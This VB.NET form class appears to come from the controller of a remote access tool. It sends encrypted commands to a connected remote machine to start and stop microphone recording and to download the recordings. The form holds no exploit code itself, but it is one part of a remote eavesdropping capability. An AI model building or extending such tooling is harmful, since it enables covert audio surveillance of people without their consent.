Public Class Audio
    Public connected As Connection
    Private Sub btn_startrecording_Click(sender As Object, e As EventArgs) Handles btn_startrecording.Click
        connected.Send(New Encryption().AES_Encrypt("RecordingStart", Form1.enckey))
        Form1.recording = True
        PictureBox2.Image = My.Resources.greenball
        Label2.Text = "Recording..."
    End Sub
    Private Sub btn_stoprecording_Click(sender As Object, e As EventArgs) Handles btn_stoprecording.Click
        connected.Send(New Encryption().AES_Encrypt("RecordingStop", Form1.enckey))
        Form1.recording = False
        PictureBox2.Image = My.Resources.redball
        Label2.Text = "Idle..."
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If Not Label2.Text = "Idle..." Then
            connected.Send(New Encryption().AES_Encrypt("RecordingStop", Form1.enckey))
            System.Threading.Thread.Sleep(1000)
            connected.Send(New Encryption().AES_Encrypt("RecordingDownload", Form1.enckey))
            Form1.recording = False
            PictureBox2.Image = My.Resources.arrow_270
            Label2.Text = "Downloading..."
        Else
            connected.Send(New Encryption().AES_Encrypt("RecordingDownload", Form1.enckey))
            Form1.recording = False
            PictureBox2.Image = My.Resources.arrow_270
            Label2.Text = "Downloading..."
        End If
    End Sub
    Private Sub Audio_Load(sender As Object, e As EventArgs) Handles Me.Load
        If Form1.recording = True Then
            PictureBox2.Image = My.Resources.greenball
            Label2.Text = "Recording..."
        End If
    End Sub
End Class